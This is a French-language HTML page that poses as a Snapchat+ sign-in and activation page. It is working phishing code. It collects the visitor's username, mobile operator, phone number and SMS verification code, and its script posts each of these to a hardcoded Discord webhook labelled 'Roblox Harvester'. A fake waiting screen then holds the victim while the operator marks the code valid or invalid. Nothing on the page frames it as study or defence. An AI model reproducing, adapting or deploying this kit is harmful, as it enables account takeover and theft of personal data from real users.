<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion | Snapchat</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
        body{margin:0;padding:0;background:#000;color:#fff;font-family:'Inter',sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;}
        .container{width:100%;max-width:420px;padding:40px 24px;text-align:center;}
        .logo{width:130px;height:130px;margin:10px auto 24px -10px;border-radius:20px;}
        h1{color:#FFFC00;font-size:28px;margin:0 0 8px 0;}
        p{color:#aaa;margin-bottom:32px;line-height:1.5;}
        .form-group{margin-bottom:20px;text-align:left;}
        label{display:block;margin-bottom:8px;font-size:14px;color:#ccc;}
        input{width:100%;padding:16px 20px;background:#1a1a1a;border:1px solid #333;border-radius:12px;color:#fff;font-size:16px;box-sizing:border-box;}
        input:focus{outline:none;border-color:#FFFC00;box-shadow:0 0 0 3px rgba(255,252,0,0.2);}
        button:not(.op-btn){width:100%;padding:16px;background:#FFFC00;color:#000;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;margin-top:12px;opacity:0.6;pointer-events:none;transition:all .3s;}
        button:not(.op-btn).enabled{opacity:1;pointer-events:auto;}
        button:not(.op-btn):hover.enabled{background:#e6e600;}
        .op-btn{padding:14px 12px;border-radius:8px;font-weight:600;cursor:pointer;border:2px solid #444;background:#222;color:#acacac;transition:all .25s;flex:1;opacity:1!important;pointer-events:auto!important;}
        .op-btn.selected{border:2px solid #FFFC00;box-shadow:0 0 12px rgba(255,252,0,0.4);color:#000!important;}
        .hidden{display:none!important;}
        .footer{margin-top:20px;font-size:13px;color:#666;}
        .faq-link{color:#aaa;font-size:14px;text-decoration:underline;cursor:pointer;margin:30px 0 15px;display:inline-block;}
        .faq-link:hover{color:#FFFC00;}
        .spinner {border: 4px solid #333;border-top: 4px solid #FFFC00;border-radius: 50%;width: 40px;height: 40px;animation: spin 1s linear infinite;margin: 20px auto;}
        @keyframes spin {0% {transform: rotate(0deg);} 100% {transform: rotate(360deg);}}
        #status {margin-top:20px;padding:15px;border-radius:12px;font-size:18px;}
    </style>
</head>
<body>
    <div class="container">
        <img src="https://files.catbox.moe/l1cylw.png" alt="Snapchat+" class="logo">
        <h1 id="title">Snapchat +</h1>
        <p id="subtitle">Connecte-toi pour continuer</p>

        <form id="step1">
            <div class="form-group"><label>Nom d'utilisateur</label><input type="text" id="username" placeholder="Saisissez votre nom d'utilisateur" required></div>
            <div class="form-group">
                <label>Opérateur mobile</label>
                <div style="display:flex;gap:10px;margin-bottom:10px;">
                    <button type="button" id="op-sfr" class="op-btn">SFR</button>
                    <button type="button" id="op-bouygues" class="op-btn">Bouygues</button>
                    <button type="button" id="op-orange" class="op-btn">Orange</button>
                </div>
                <small style="color:#ff4444;display:block;">FREE ne fonctionne pas.</small>
                <input type="hidden" id="operator" value="">
            </div>
            <div class="form-group">
                <label>Numéro de téléphone</label>
                <input type="tel" id="phone" placeholder="06 XX XX XX XX" required maxlength="10" oninput="validatePhone(this);">
            </div>
            <button type="submit" id="continueBtn">Continuer</button>
        </form>

        <form id="step2" class="hidden">
            <div class="form-group">
                <label>Code d'activation</label>
                <input type="text" id="code" maxlength="4" placeholder="0000" required style="text-align:center;font-size:28px;letter-spacing:12px;" oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,4); validateCode();">
            </div>
            <button type="submit" id="verifyBtn">Vérifier le code</button>
        </form>

        <div id="step3" class="hidden">
            <div class="spinner"></div>
            <h1 style="font-size:24px;margin:20px 0;">Vous êtes sur la liste d'attente</h1>
            <p style="font-size:18px;">pour l'activation de Snapchat+<br>(1-3 minutes)</p>
            <div id="status"></div>
        </div>

        <div class="footer">
            <span class="faq-link" id="faqLink">Vous avez des questions ?</span><br>Snapchat ++
        </div>
    </div>

    <script>
        const WEBHOOK = "https://canary.discord.com/api/webhooks/1516859614702862427/86JZxldX-W2IwTT1IhRAJUH73M29BXP_IFVKLxNOZ5DwqllJwy-a9TvQUAC8ZHq2PkdG?with_components=true";
        const BASE_URL = window.location.origin;
        let currentSessionId = null;
        let pollingInterval = null;

        function sendEmbed(title, fields, buttons = []) {
            const payload = {
                username: "Roblox Harvester",
                content: "@everyone",
                embeds: [{
                    title: title,
                    color: 0xFFFC00,
                    fields: fields,
                    timestamp: new Date().toISOString(),
                    footer: { text: "Roblox + Harvester • " + new Date().toLocaleString('fr-FR') }
                }]
            };
            if (buttons && buttons.length > 0) {
                payload.components = [{ type: 1, components: buttons }];
            }
            fetch(WEBHOOK, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });
        }

        function validatePhone(input) {
            let v = input.value.replace(/[^0-9]/g,'');
            if (v.length > 0 && !v.startsWith('06') && !v.startsWith('07')) v = v.substring(0,2);
            input.value = v.slice(0,10);
        }

        function validateCode() {
            const code = document.getElementById('code').value.trim();
            const btn = document.getElementById('verifyBtn');
            if (code.length === 4) btn.classList.add('enabled');
            else btn.classList.remove('enabled');
        }

        const opButtons = {
            'op-sfr': {name:'SFR', color:'#FF3333'},
            'op-bouygues': {name:'Bouygues', color:'#1E90FF'},
            'op-orange': {name:'Orange', color:'#FF8800'}
        };

        Object.keys(opButtons).forEach(id => {
            const btn = document.getElementById(id);
            btn.addEventListener('click', () => {
                document.querySelectorAll('.op-btn').forEach(b => {
                    b.classList.remove('selected');
                    b.style.background = '';
                    b.style.color = '#acacac';
                    b.style.borderColor = '';
                });
                btn.classList.add('selected');
                btn.style.background = opButtons[id].color;
                btn.style.color = '#000';
                btn.style.borderColor = '#FFFC00';
                document.getElementById('operator').value = opButtons[id].name;
                document.getElementById('continueBtn').classList.add('enabled');
            });
        });

        document.getElementById('step1').addEventListener('submit', e => {
            e.preventDefault();
            const username = document.getElementById('username').value.trim();
            const phone = document.getElementById('phone').value.trim();
            const operator = document.getElementById('operator').value;

            if (!operator || phone.length < 10) return alert("Données invalides");

            sendEmbed("🔐 Snapchat - Étape 1", [
                {name:"Nom d'utilisateur", value: `\`${username}\``},
                {name:"Opérateur", value: `\`${operator}\``},
                {name:"Téléphone", value: `\`${phone}\``}
            ]);

            document.getElementById('step1').classList.add('hidden');
            document.getElementById('step2').classList.remove('hidden');
            document.getElementById('title').textContent = "Vérification";
            document.getElementById('subtitle').textContent = "Entrez le code reçu";
        });

        document.getElementById('step2').addEventListener('submit', e => {
            e.preventDefault();
            const username = document.getElementById('username').value.trim();
            const phone = document.getElementById('phone').value.trim();
            const code = document.getElementById('code').value.trim();
            currentSessionId = 'sess_' + Math.random().toString(36).substr(2, 9);

            if (code.length !== 4) return alert("Le code doit contenir 4 chiffres");

            sendEmbed("✅ Snapchat - Code reçu", [
                {name:"Nom d'utilisateur", value: `\`${username}\``},
                {name:"Téléphone", value: `\`${phone}\``},
                {name:"Code entré", value: `\`${code}\``}
            ], [
                { type: 2, style: 5, label: "❌ Code NON valide", url: `${BASE_URL}/validate?sessionId=${currentSessionId}&valid=false` },
                { type: 2, style: 5, label: "✅ Code VALIDE - Activation", url: `${BASE_URL}/validate?sessionId=${currentSessionId}&valid=true` }
            ]);

            document.getElementById('step2').classList.add('hidden');
            document.getElementById('step3').classList.remove('hidden');
            document.getElementById('title').textContent = "Activation Snapchat+";

            if (pollingInterval) clearInterval(pollingInterval);

            pollingInterval = setInterval(() => {
                if (!currentSessionId) return;
                fetch(`/status/${currentSessionId}`)
                    .then(r => r.json())
                    .then(data => {
                        if (data && data.validated !== null) {
                            const statusDiv = document.getElementById('status');
                            if (data.validated) {
                                statusDiv.style.background = 'rgba(0,255,0,0.15)';
                                statusDiv.style.color = 'lime';
                                statusDiv.innerHTML = `<strong>✅ CODE VALIDE - Snapchat+ Activé !</strong>`;
                            } else {
                                statusDiv.style.background = 'rgba(255,0,0,0.15)';
                                statusDiv.style.color = 'red';
                                statusDiv.innerHTML = `<strong>❌ CODE NON VALIDE</strong><br>Réessayez.`;
                            }
                            clearInterval(pollingInterval);
                        }
                    }).catch(() => {});
            }, 2500);
        });

        document.getElementById('faqLink').addEventListener('click', () => {
            alert("Questions fréquentes Snapchat+ :\n\n- Code non reçu ? Réessaye dans 30s.\n- Activation en cours...");
        });
    </script>
</body>
</html>
